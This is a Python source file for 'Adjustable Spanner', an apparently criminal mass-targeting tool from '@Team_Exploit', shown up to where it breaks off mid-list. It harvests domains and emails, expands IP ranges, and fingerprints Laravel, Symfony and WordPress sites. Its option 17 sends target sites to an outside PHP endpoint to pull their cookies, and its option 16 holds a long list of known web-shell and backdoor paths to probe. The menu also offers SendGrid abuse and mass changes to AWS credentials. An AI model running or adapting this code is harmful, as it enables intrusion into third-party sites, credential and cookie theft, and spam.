# our channel : @Esfelurm
# Tool : Adjustable spanner
# Version : 0.0.1
__START__ = "@Team_Exploit"
#--------------------------------
import requests,time,os,regex,re,random,sys,os,socket,ipranges
from colorama import (Fore, Back, Style, init)
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.dummy import Pool
import concurrent.futures as concurrent
from pyisemail import is_email
import numpy as np
from re import findall
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

res = []
resi = []
tempatsampah = []
tmpt = []
tmp = []
os.system('cls' if os.name == 'nt' else 'clear')
tmip = []

if os.path.exists("AdjustableSpanner"): 
    pass
else: 
    os.mkdir("AdjustableSpanner") 
def vcolor ( text ): return text.format(w=Fore.WHITE, g=Fore.GREEN, r=Fore.RED, y=Fore.YELLOW, b=Fore.BLUE, c=Fore.CYAN , re=Fore.LIGHTRED_EX) 
def vinfo ( t, m ): print( vcolor( " {w}[" + t + "{w}] " + m ) )
def vinpt ( t ): return input( vcolor( " {w}[{b}+{w}] {y}" + t + " {w}> " ) )
def verr ( u, m ): print(Back.RED + " [V] " + m + " [V] 033[0m " + u)
def vsucc ( u, c ): print(Back.GREEN + " [V] " + str(c) + " [V] 033[0m " + u)

def main():
    colors = list(vars(Fore).values())
    os.system(["clear", "cls"][os.name == 'nt'])
    maintance = """
    WeedyDev
    """
    logo = """ {g}                                                                                                                              
                                                       ...                      
                       .             .            :=*#######*-                  
                    : ..             .- ..      .*########+=:.                  
                   =  +               =. =.     #######=.                       
                  *. +-                #  #    -#######-                        
                 =* .@                 #= =+   *########.                       
                 %- *%...::       ::...*% .@. -###***+###   .-=*#:              
                :@. .=--+*=*+*=+**=*+=-=:  @=.##=*++*+:##*+#####=               
                =@+++==-=-=#@@@@@%+-=-==+++@%###+:#**#=-##+###+.                
                 .:   -*+-+%%@@@@%+-+#=   -######-=*++*=###+-                   
                    =*-.=#+.%@@@@:=#=.-*+=+****###+**+=-:.                      
                 :*+:  :@* .@@@@@- =@=.=*%@%###+#*=:                            
               #%+.    :@*  #@@@@  =@#+*###%@@*+:                               
               @*      .@+  :@@@= .*@%#######@-                                 
               %*       @+   +@#.=*#@%####*+*@                                  
               +#       %+    =++*#%@%##*+- +#                                  
               .@       #+  .=**###%@#*+-   %:                                  
                ==      =*.=**#####%%+=    .*                                   
                 +      :@**######*%+      +                                    
                  :   .=*%######*+=%      ..                                    
                    .=**##%####*=.:-      .    Channel telegram/github : @ESFELURM                                 
                  .+#+####%##*+:  =            Adjustable Spanner Spider                                
                .+###+#####*+:   :                                              
               =*.   -****+-                                                    
               #.     =##-                                                      
               ++.   :*=                                                        
                :=+++-                                                          
   """
    option="""                                                                                                            
| Grabbers |                                                                        |  SHELLS  |                                      
|----------|                                                                        |----------|
{g}[{w}1{g}] {w}Grabber Sites COM By Dates Updated Daily Result {g}                 {g}[{w}15{g}] {w}Shell/Mailer Finder  {g}
{g}[{w}2{g}] {w}Grabber Sites By Domain + Country  {g}                              {g}[{w}16{g}] {w}Shell Scaner  {g}
{g}[{w}3{g}] {w}Grabber Sites UK From Page {r}
{g}[{w}4{g}] {w}Grabber Option 2 + Option Number 10 + Option Number 19
{g}[{w}5{g}] {w}Grabber By Years/Date/Month {g}
{g}[{w}6{g}] {w}Grab Mail/Email From Website List / Ip List + Auto Filter {g}
{g}[{w}7{g}] {w}Zoomeye Grabber With Query/Dork And API   {g}
{g}[{w}8{g}] {w}Leakix Grabber With Query/Dork And API  {g}
| IPS OPT  |                                                                        | LARAVEL  |   
|----------|                                                                        |----------|
{g}[{w}9{g}]  {w}Range IP From IPS List  {g}                                        {g}[{w}17{g}] {w}Auto Exploit Cookies BlueMail {g}
{g}[{w}10{g}] {w}Domain To IP  {g}                                                  {g}[{w}18{g}] {w}Auto Check Bluemail sites/ip  {g}
{g}[{w}11{g}] {w}Option Number 9 + Option Number 10 Auto {g}                        {g}[{w}19{g}] {w}Auto Check Laravel + Apache Symfony + Wordpress site/ip {g}
{g}[{w}12{g}] {w}ASN IPs Grabber Asn Method To Get IPs  {g}                         {g}[{w}20{g}] {w}Auto Filter Mailist Hotmail, Yahoo, Gmail {g}
{g}[{w}13{g}] {w}Generator Random IPS {g}                                           {g}[{w}21{g}] {w}Mass Check Sengrid Limit + Send Test In Your Mail {g}
{g}[{w}14{g}] {w}Remove Duplicate From List {g}                                     {g}[{w}22{g}] {w}Mass Change User+Pass Aws + Send In Your Mail {g}
   """
    for line in logo.splitlines():
        print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        time.sleep(0.05)
    for line in option.splitlines():
        print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        time.sleep(0.05)

    select = input(f"   {Fore.GREEN}[{Fore.WHITE}!{Fore.GREEN}] Your Options > {Fore.WHITE}")
    if select == "1":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        res = []
        print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Just Input Dates . Exaple Input Date : 12 {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE}')
        tanggal = input(f"   {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Input Date : ")
        page = int(input(f"  {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Page : "))
        sampe = int(input(f"  {Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Until Page : "))

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'}
        res = []
       # try:
        nyampe = range(page, sampe)
        for rage in nyampe:
            url = f"https://allthecom.info/{tanggal}/{rage}/"
            r = requests.get(url, headers=headers)
            soup = BeautifulSoup(r.text, 'html.parser')
            for result in soup.find_all('a'):
                if ".com" in result.text:
                    res.append(result)
                    print(result.text)
                    open( 'result-'+tanggal+'.txt', 'a').write(result.text+"n")
                else:
                    continue
      #  except:
            pass
        print('Total Dari Page ', page)
        print('Sampai Page : ', sampe)
        print('033[32;1mGrab : ', len(res))
        print('033[32;1m Saved In pgrab.txt')
    elif select == "2":
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        res = []
        print(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Example Name Country : germany , Name Domain : de . (DONT USE CAPITAL LETTER,AND DONT USE (.) ON DOMAIN NAME ),(USE FORMAL COUNTRY NAME)")
        negara = input(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Name Country : ")
        singkatan = input(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Name Domain : ")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'}
        res = []
        try:
            print("n  Please Wait Domain Loading ...")
            url = f"https://dataset.domainsproject.org/{negara}/domain2multi-{singkatan}00.txt"
            r = requests.get(url, headers=headers).text
            soup = BeautifulSoup(r, 'html.parser')
            if '404 Not Found' in r:
                print('CHANGING DATA...')
                url = f"https://dataset.domainsproject.org/{negara}/domain2multi-{singkatan}.txt"
                r4 = requests.get(url, headers=headers).text
                if '404 Not Found' in r4:
                    print('MAYBE YOU INPUT WRONG COUNTRY / DOMAIN NAME PLEASE CHECK IT')
                    input('Click Enter To Exit')
                    sys.exit()
                soup = BeautifulSoup(r4, 'html.parser')
                print(r4)
                print("Saved Resultt ...")
                time.sleep(6)
                open( "AdjustableSpanner/" + negara + ".txt", "a" ).write( r + "n" )
            else:
                print(r)
                print("Saved Resultt ...")
                time.sleep(6)
                open( "AdjustableSpanner/" + negara + ".txt", "a" ).write( r + "n" )
        except:
            pass

        print('Saved In '+negara+'.txt')
    elif select == "9":
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        strip = '.'
        inputip = input(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Enter List File IP :")
        for ip in open(inputip).read().splitlines():
            spl = ip.split('.')
            try:
                for result in range(0, 251):
                    resultx = spl[0] + strip + spl[1] + strip + spl[2] + strip + str(result)
                    open('ranged-ender.txt', 'a').write(resultx + 'n')
                    print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {ip} | {Fore.GREEN}[ Ranged IP Ender ]{Style.RESET_ALL}")

                for result in range(0, 251):
                    resultq = spl[0] + strip + spl[1] + strip + str(result) + strip + spl[2]
                    open('ranged-middle.txt', 'a').write(resultq + 'n')
                    print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {ip} | {Fore.GREEN}[ Ranged IP Middle ]{Style.RESET_ALL}")

            except:
                pass
    elif select == "17":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in maintance.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        time.sleep(0.05)
        input('Click Enter To Exit')
        return 0
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        strip = '.' 
        inputip = input(f"{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Enter List File Name Sites : ")
        for web in open(inputip).read().splitlines():
            if web.startswith("http://"): 
                web = web.replace("http://" , "")
            elif web.startswith("https://"): 
                web = web.replace("https://" , "")

            payload = {
                'twilio': web
            }
            try:
                r = requests.post('https://rtvsmkqfa3clrvgj6f-9fd73c.ingress-daribow.easywp.com/wp-admin/v1/1.php', data=payload , timeout=10)
                if "Null" in r.text:
                    print(f"{Fore.BLUE}|{Fore.WHITE}{web}{Fore.BLUE}|{Fore.RED} Not Vuln | {Fore.WHITE}{r.text}")

                else:
                    print(f"{Fore.BLUE}|{Fore.WHITE}{web}{Fore.BLUE}|{Fore.GREEN} Succes Exploit -> {Fore.WHITE}{r.text}")
                    open('AdjustableSpanner/exploit_cookies.txt', 'a').write(web + ' Cookies -> '+r.text + '')
            except:
                pass
    elif select == "18":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in maintance.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
        time.sleep(0.05)
        input('Click Enter To Exit')
        return 0
        
        
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        os.system(["clear", "cls"][os.name == 'nt'])
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        def cekblue(inputlist):
            for webcek in inputlist.splitlines():
                if not webcek.startswith("http"): webcek = "http://" + webcek
             #   try:
                response = requests.get( webcek , timeout = 10 , verify=False )
                if "authentication/login" in response.text: 
                    print(f"|{webcek}|  -> |{Fore.GREEN}Bluemail{Style.RESET_ALL}|")
                    open('AdjustableSpanner/bluemail-valid.txt', 'a').write(webcek + 'n')
                else: 
                    print(f"|{webcek}| -> |{Fore.RED}Not BlueMail{Style.RESET_ALL}|")
                    open('AdjustableSpanner/not-bluemail.txt', 'a').write(webcek + 'n')
                
                    
            #    except: 
                #    print( webcek +" - > ERROR" )
              #      continue

        for line in logo.splitlines():
                    print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                    time.sleep(0.05)
        inputlist = open(input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}"), 'r').read().split('n')
        threadblue = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread : {Style.RESET_ALL}")
        if inputlist:
          #  try:
            with ThreadPoolExecutor(int(threadblue)) as zz:
                zz.map(cekblue, inputlist)
         #   except:
           #     pass        
    elif select == "19":
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        os.system(["clear", "cls"][os.name == 'nt'])
        t1 = time.perf_counter()
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        def cekblue(webcek):
           
            if not webcek.startswith("http"): webcek = "http://" + webcek
            try:
                response = requests.get( webcek , timeout = 5 , verify=False )
        
                if "symfony/profiler/" in response.text or "symfony" in response.text: 
                    print(f"|{webcek}|  -> |{Fore.GREEN} SYMFONY + APACHE {Style.RESET_ALL}|")
                    open('AdjustableSpanner/symfony-valid-web.txt', 'a').write(webcek + 'n')
                elif "laravel_session" in response.cookies:
                    print(f"|{webcek}|  -> |{Fore.GREEN} LARAVEL {Style.RESET_ALL}|")
                    open('AdjustableSpanner/laravel-valid-web.txt', 'a').write(webcek + 'n')
                elif "wp-content/" in response.text:
                    print(f"|{webcek}|  -> |{Fore.GREEN} WORDPRESS {Style.RESET_ALL}|")
                    open('AdjustableSpanner/wordpress-valid-web.txt', 'a').write(webcek + 'n')
                else: 
                    response2 = requests.get( webcek + "/_profiler/empty/search/results" , timeout = 5 , verify=False )
                    if "symfony/profiler/" in response2.text or "symfony" in response2.text: 
                        print(f"|{webcek}|  -> |{Fore.GREEN} SYMFONY + NGINX {Style.RESET_ALL}|")
                        open('AdjustableSpanner/symfony-valid-web.txt', 'a').write(webcek + 'n')
                    else:
                        print(f"|{webcek}| -> |{Fore.GREEN}Unknown Framework{Style.RESET_ALL}|")
                        open('AdjustableSpanner/unknown-live.txt', 'a').write(webcek + 'n')
                    
                    
            except: 
                print(f"|{webcek}| -> |{Fore.RED}BAD IPS/LOW RESPOND{Style.RESET_ALL}|")
                pass

        for line in logo.splitlines():
                    print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                    time.sleep(0.05)
        sitelists = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}" )
        if not os.path.exists( sitelists ): vinfo( "{g}x", "the list not found in current dir" ); exit()
        try:
            inputlist = open( sitelists, "r", encoding="utf8" , errors='ignore').read().splitlines()
            threadblue = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread : {Style.RESET_ALL}")   
        except:
            pass
        if inputlist:
            try:
                with ThreadPoolExecutor(int(threadblue)) as zz:
                    zz.map(cekblue, inputlist)

                t2 = time.perf_counter()
                print(f'MultiThreaded Code Took:{t2 - t1} seconds')
                print('Script Already Done')
            except:
                pass

    elif select == "20":
        os.system(["clear", "cls"][os.name == 'nt'])
        if os.path.exists("AdjustableSpanner"): pass 
        else: 
            os.mkdir("AdjustableSpanner")
        awww = re.compile(r'''(
                   ([a-zA-Z0-9._%+-]+)
                    @
                    (gmail|yahoo|hotmail)
                    (.com)
                    )''', re.VERBOSE)

        def file_to_str():
            for line in logo.splitlines():
                print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                time.sleep(0.05)
            filename = input(f'n{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Name List?')
            with open(filename) as f:
                return f.read().lower()

        def get_emails(s):
            return (email[0] for email in re.findall(awww, s) if not email[0].startswith('//'))

        def main():
            try:
                for email in get_emails(file_to_str()):
                    if 'gmail' in email:
                        print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Detected Gmail {Fore.YELLOW} > {email}')
                        f =open('/AdjustableSpanner/gmail-file.txt', 'a')
                        f.write(email+'n')
                        f.close()
                    elif 'yahoo' in email:
                        print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Detected Yahoo {Fore.YELLOW} > {email}')
                        f = open('/AdjustableSpanner/yahoo-file.txt', 'a')
                        f.write(email + 'n')
                        f.close()
                    elif 'hotmail' in email:
                        print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Detected Hotmail {Fore.YELLOW} > {email}')
                        f = open('/AdjustableSpanner/hotmail-file.txt', 'a')
                        f.write(email + 'n')
                        f.close()
                    else:
                        print(f'{Fore.RED}[{Fore.WHITE}!{Fore.RED}]{Fore.WHITE} Detected Random Mail {Fore.YELLOW} > {email}')
                        f = open('/AdjustableSpanner/random.txt', 'a')
                        f.write(email + 'n')
                        f.close()


                print('[+] Succes filter Saved In Folder /AdjustableSpanner/ [+]' )


            except Exception as e:
                print('Error Description', e)
        main()    
    elif select == "3":
        if os.path.exists("AdjustableSpanner"): pass 
        else: 
            os.mkdir("AdjustableSpanner")
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        try:
            page1 = int(input(f"{Fore.YELLOW}[{Fore.BLUE}!{Fore.YELLOW}] From page > {Style.RESET_ALL}"))
            page2 = int(input(f"{Fore.YELLOW}[{Fore.BLUE}!{Fore.YELLOW}] Until page > {Style.RESET_ALL}"))
            page = np.arange(page1, page2)
            for url in page:
                arrayweb = [
                f"http://www.whythink.co.uk/domain_resources/current_domains/domains_websites-{url}.html", f"http://www.whythink.co.uk/domain_resources/sex/sexdomains-{url}.html", f"http://www.whythink.co.uk/domain_resources/home_counties_domains/home_counties_domains-{url}.html"]
                for website in arrayweb:
                    r = requests.get(website).text
                    s = BeautifulSoup(r, 'html.parser')
                    for result in s.find_all('font'):
                        result = result.text.replace(' ', 'n')
                        if findall('([A-Za-z0-9].co.uk)', result):
                            open('AdjustableSpanner/result-uk-frompage.txt', 'a').write(result+"n")
                            print(f'{Fore.RED}|{Fore.WHITE}Grabing{Fore.RED}|-{Fore.GREEN}|{Fore.WHITE}{result}{Fore.GREEN}-|{Fore.WHITE}SUCCES{Fore.GREEN}|')
                        else:
                            continue
        
        except ValueError as e:
            try:
                print(e)
            finally:
                e = None
                del e

    elif select == "10":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        def domtoip(filewebs3):
            try:
                filewebs4 = filewebs3.replace('http://', '').replace('https://', '').replace('/', '')
                hostn = socket.gethostbyname(filewebs4)
                pid = os.getpid()
                print(f"{Fore.WHITE}|{Fore.GREEN}SUCCES {pid}{Fore.WHITE}|{Style.RESET_ALL} |{filewebs4}|-|{Fore.BLUE}{hostn}{Style.RESET_ALL}|")
                open('AdjustableSpanner/domain-to-ips.txt', 'a').write(hostn + 'n')
            except:
                pass


        filewebs3 = open(input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}"), 'r').read().split('n')
        threaddom = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread : {Style.RESET_ALL}")
        if filewebs3:
          #  try:
            with ThreadPoolExecutor(int(threaddom)) as zz:
                zz.map(domtoip, filewebs3)
         #   except:
              #  pass

    elif select == "4":
        requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
        os.system(["clear", "cls"][os.name == 'nt'])
        if os.path.exists("AdjustableSpanner"): pass
        else: 
            os.mkdir("AdjustableSpanner") 
        def cekblue(inputlist):
            
            for webcek in inputlist.splitlines():
                webcek = socket.gethostbyname(webcek)
                if webcek not in tmpt:
                    tmpt.append(webcek)
                else:
                    print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
                    
                if not webcek.startswith("http"): webcek = "http://" + webcek
                try:
                    response = requests.get( webcek , timeout = 5 , verify=False )
                    if response.status_code == 200:
                        print(f"|{webcek}|  -> |{Fore.GREEN}LIVE IPS{Style.RESET_ALL}|")  
                        if "laravel_session" in response.cookies: 
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}|  -> |{Fore.GREEN}LARAVEL{Style.RESET_ALL}|")
                                open('AdjustableSpanner/laravel-valid-web.txt', 'a').write(webcek + 'n')
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
                        elif "symfony/profiler/" in response.text or "symfony" in response.text:
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}|  -> |{Fore.GREEN}SYMFONY APACHE{Style.RESET_ALL}|")
                                open('AdjustableSpanner/symfony-valid-web.txt', 'a').write(webcek + 'n')
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
                        elif "wp-content/" in response.text:
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}|  -> |{Fore.GREEN}WORDPRESS{Style.RESET_ALL}|")
                                open('AdjustableSpanner/wordpress-valid-web.txt', 'a').write(webcek + 'n')
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")

                        else: 
                            if webcek not in tempatsampah:
                                tempatsampah.append(webcek)
                                print(f"|{webcek}| -> |{Fore.GREEN}UNKNOWN FRAMEWORK{Style.RESET_ALL}|")
                                open('AdjustableSpanner/live-ips.txt', 'a').write(webcek + 'n')
                            else:
                                print(f"|{webcek}|  -> |{Fore.RED}DUPLICATE IP{Style.RESET_ALL}|")
            
                        

                    else: 
                        print(f"|{webcek}| -> |{Fore.RED}BAD IPS{Style.RESET_ALL}|")
                
                    
                except: 
                    print(f"|{webcek}| -> |{Fore.RED}BAD IPS{Style.RESET_ALL}|")
                    continue
                

        for line in logo.splitlines():
                    print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
                    time.sleep(0.05)
        print(f"{Fore.BLUE}Example Country Name : germany , Domain Name : de")
        negara = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Country Name  : {Style.RESET_ALL}")
        singkatan = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Domain Name  : {Style.RESET_ALL}")
        threadblue = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread Auto Check Framework + Change To IPs : {Style.RESET_ALL}")
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0'}
        res = []
        try:
            print("n  Please Wait Domain Loading ...")
            url = f"https://dataset.domainsproject.org/{negara}/domain2multi-{singkatan}00.txt"
            r = requests.get(url, headers=headers).text
            soup = BeautifulSoup(r, 'html.parser')
            if '404 Not Found' in r:
                print('CHANGING DATA...')
                url = f"https://dataset.domainsproject.org/{negara}/domain2multi-{singkatan}.txt"
                r4 = requests.get(url, headers=headers).text
                soup = BeautifulSoup(r4, 'html.parser')
                print(r4)
                print("Saved Resultt ...")
                open( "AdjustableSpanner/" + negara + ".txt", "a" ).write( r4 + "n" )
                if '404 Not Found' in r4:
                    os.system(["clear", "cls"][os.name == 'nt'])
                    print('MAYBE YOU INPUT WRONG COUNTRY / DOMAIN NAME PLEASE CHECK IT')
                    print('PLEASE INPUT VALID DOMAIN AND COUNTRY NAME')
                    input('Click Enter To Exit')
                    sys.exit()
            else:
                soup = BeautifulSoup(r, 'html.parser')
                print(r)
                print("Saved Resultt ...")
                open( "AdjustableSpanner/" + negara + ".txt", "a" ).write( r + "n" )
            time.sleep(3)
            print(f"Already Saved In AdjustableSpanner/{negara}.txt")
        except:
            pass

        print('Saved In '+negara+'.txt')
        print('Starting Change To IPs + Check Framework')
        time.sleep(3)
        inputlist = open("AdjustableSpanner/" + negara + ".txt", 'r').read().split('n')    
        if inputlist:
          #  try:
            with ThreadPoolExecutor(int(threadblue)) as zz:
                zz.map(cekblue, inputlist)
         #   except:
           #     pass

        
    elif select == "11":
        os.system(["clear", "cls"][os.name == 'nt'])
        for line in logo.splitlines():
            print("".join(colors[random.randint(1, len(colors)-1)] + vcolor( line ) ))
            time.sleep(0.05)
        def domtoip(filewebs3):
            try:
                filewebs4 = filewebs3.replace('http://', '').replace('https://', '').replace('/', '')
                hostn = socket.gethostbyname(filewebs4)
                pid = os.getpid()
                print(f"{Fore.WHITE}|{Fore.GREEN}SUCCES {pid}{Fore.WHITE}|{Style.RESET_ALL} |{filewebs4}|-|{Fore.BLUE}{hostn}{Style.RESET_ALL}|")
                open('AdjustableSpanner/domain-to-ips-option-11.txt', 'a').write(hostn + 'n')
                
            except:
                pass


        filewebs3 = open(input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Enter List File Web : {Style.RESET_ALL}"), 'r').read().split('n')
        threaddom = input(f"{Fore.WHITE}|{Fore.RED}INPUT{Fore.WHITE}| Thread Change Domain To IPs : {Style.RESET_ALL}")
        if filewebs3:
          #  try:
            with ThreadPoolExecutor(int(threaddom)) as zz:
                zz.map(domtoip, filewebs3)
                time.sleep(1)
                os.system("cls")
                print(f"n {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Saving Domain To IPs First ")
                time.sleep(1)
                os.system("cls")
                print(f" {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Proccesing To Auto Range IP ")
                print(f" {Fore.WHITE}[{Fore.RED}!{Fore.WHITE}] Please Wait , Thank You ")
                time.sleep(1.5)
                for ip in open('AdjustableSpanner/domain-to-ips-option-11.txt').read().splitlines():
                    
                    print(ip)
                    spl = ip.split('.')
                    strip = '.' 
               #     try:
                    for result in range(0, 251):
                        resultx = spl[0] + strip + spl[1] + strip + spl[2] + strip + str(result)
                        open('AdjustableSpanner/ranged-ender-option-11.txt', 'a').write(resultx + 'n')
                        print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {resultx} | {Fore.GREEN}[ Ranged IP Ender ]{Style.RESET_ALL}")

                    for result in range(0, 251):
                        resultq = spl[0] + strip + spl[1] + strip + str(result) + strip + spl[2]
                        open('AdjustableSpanner/ranged-middle-option-11.txt', 'a').write(resultq + 'n')
                        print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {resultq} | {Fore.GREEN}[ Ranged IP Middle ]{Style.RESET_ALL}")
                        open('AdjustableSpanner/ranged-all-option-11.txt', 'a').write(resultx + 'n' + resultq +'n')
                        print(f"{Fore.BLUE}[SUCCCES]{Style.RESET_ALL} | {ip} | {Fore.GREEN}[ Ranged IP Both ]{Style.RESET_ALL}")

    elif select == "16":
        def find(sote):
            for sites in sote.splitlines():
                if "http://" in sites:
                    sites = sites               
                else:
                    sites = "http://"+sites
                    shells = ['wsu.php', '15.php', '/wp-admin/marijuana.php', '/ntol.php', 'aa.php', '/wp-content/15.php', '/wp/wp-content/plugins/xsid/marijuana.php', '/wp/minishell.php', 'wso.php', 'wso-2.5.php', 'wos.php?login=wos', '1945.php?login=1945', 'wos.php', '1945.php', '45.php', 'cc.php', 'ls.php', 'system.php', 'cmd.php', 'rootx.php', 'adminer.php', 'jkt48_1.php', 'indonesia.php', 'php.php', 'b374k.php', '1n73ction.php', 'shell.php', 'sh3ll.php', 'root.php', 'bh.php', 'sbh.php', 'idca.php', 'indoxploit.php', 'indoxploit_shell.php', 'idca_shell.php', 'bejak.php', 'injection.php', 'gaza.php', 'andela.php', 'jkt48.php', 'backdoor.php', 'backd00r.php', '1337.php', 'komet.php', 'bekdur.php', 'bd.php', 'arab.php', 'xxx.php', 'c99.php', 'r57.php', 'webadmin.php', 'data.php', 'konten.php', 'kamu.php', 'iya.php', 'koe.php', 'gca.php', 'sj.php', 'shell.asp', 'R57.php', 'C99.php', 'inject.php', 'kdoor.php', 'index.php', 'o.php', 'mosok.php', 'v.php', 'i.php', 'a.php', 's.php', 'ap.php', 'you.php', '1.php', '2.php', '3.php', '4.php', '5.php', '6.php', '7.php', '8.php', '9.php', '10.php', '/wp-content/plugins/disqus-comment-system/WSO.php', '/wp-content/plugins/disqus-comment-system/dz.php', '/wp-content/plugins/disqus-comment-system/DZ.php', '/wp-content/plugins/disqus-comment-system/cpanel.php', '/wp-content/plugins/disqus-comment-system/cpn.php', '/wp-content/plugins/disqus-comment-system/sos.php', '/wp-content/plugins/disqus-comment-system/term.php', '/wp-content/plugins/disqus-comment-system/Sec-War.php', '/wp-content/plugins/disqus-comment-system/sql.php', '/wp-content/plugins/disqus-comment-system/ssl.php', '/wp-content/plugins/disqus-comment-system/mysql.php', '/wp-content/plugins/disqus-comment-system/WolF.php', '/wp-content/plugins/disqus-comment-system/madspot.php', '/wp-content/plugins/disqus-comment-system/Cgishell.pl', '/wp-content/plugins/disqus-comment-system/killer.php', '/wp-content/plugins/disqus-comment-system/changeall.php', '/wp-content/plugins/disqus-comment-system/2.php', '/wp-content/plugins/disqus-comment-system/Sh3ll.php', '/wp-content/plugins/disqus-comment-system/dz0.php', '/wp-content/plugins/disqus-comment-system/dam.php', '/wp-content/plugins/disqus-comment-system/user.php', '/wp-content/plugins/disqus-comment-system/dom.php', '/wp-content/plugins/disqus-comment-system/whmcs.php', '/wp-content/plugins/disqus-comment-system/vb.zip', '/wp-content/plugins/disqus-comment-system/r00t.php', '/wp-content/plugins/disqus-comment-system/c99.php', '/wp-content/plugins/disqus-comment-system/gaza.php', '/wp-content/plugins/disqus-comment-system/1.php', '/wp-content/plugins/disqus-comment-system/d0mains.php', '/wp-content/plugins/disqus-comment-system/madspotshell.php', '/wp-content/plugins/disqus-comment-system/info.php', '/wp-content/plugins/disqus-comment-system/egyshell.php', '/wp-content/plugins/disqus-comment-system/Sym.php', 